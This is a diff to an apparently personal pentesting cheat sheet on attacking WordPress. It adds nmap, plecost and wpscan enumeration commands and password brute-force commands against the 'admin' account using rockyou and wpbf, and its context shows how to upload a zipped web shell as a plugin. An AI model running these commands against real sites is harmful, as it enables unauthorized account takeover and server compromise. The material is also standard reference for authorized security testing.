@@ -8,6 +8,14 @@ The text above was extracted from [Wikipedia](https://en.wikipedia.org/wiki/Word
 
 ## Enumerating WordPress
 
+### Nmap
+
+We can nmap nse scripts:
+
+```text
+sudo nmap --script http-wordpress-enum target.xyz
+```
+
 ### WPScan
 
 Before starting a wpscan you should update it:
@@ -54,7 +62,13 @@ An alternative method to enumerate users without a wordlist can be the following
  for i in {1..5}; \ do curl -L -s http://target/?author=$i \ | grep -iPo '(?<=<title>)(.*)(?=</title>)' \ | cut -f1 -d" " |grep -v "Page"; done
 ```
 
+### Plecost
 
+Enumerate plugins:
+
+```text
+plecost -i /usr/share/plecost/wp_plugin_list.txt http://target
+```
 
 ### Enumerating Plugins
 
@@ -64,11 +78,37 @@ SecLists has a good wordlist for fuzzing for plugins called `wp-plugins.fuzz.txt
 wfuzz -c -t 200 --hc=404 -w wp-plugins.fuzz.txt http://10.10.10.88/webservices/wp/FUZZ
 ```
 
+We can wpscan to enumerate plugins:
+
+```text
+ wpscan --url http://target --enumerate p
+```
+
 ## Attacking WordPress
+
+### Bruteforce
+
+#### wpscan
+
+We can supply a wordlist of passwords, and the “--username” parameter with a value of “admin” and if we’re lucky, we may be able to get access to the administrative interface:
+
+```text
+wpscan --url http://target --wordlist /usr/share/wordlists/rockyou.txt --username admin
+```
+
+#### **wpbf**
+
+{% embed url="https://github.com/atarantini/wpbf" %}
+
+Bruteforce with username:
+
+```text
+ python wpbf.py -w passwords.txt -u admin http://target
+```
 
 ### Plugins WebShell
 
-First, find a webshell and compress it into a zip file:
+First, find a web shell and compress it into a zip file:
 
 ```text
 kali@kali:~$ cd /usr/share/seclists/Web-Shells/WordPress
@@ -76,7 +116,7 @@ kali@kali:/usr/share/seclists/Web-Shells/WordPress$ sudo zip plugin-shell.zip pl
 adding: plugin-shell.php (deflated 58%)
 ```
 
-Then follow this steps:
+Then follow these steps:
 
 Plugins -&gt; Add New -&gt; Upload Plugin -&gt; Browse -&gt; plugin-shell.zip -&gt; Open -&gt; Install Now -&gt;
 
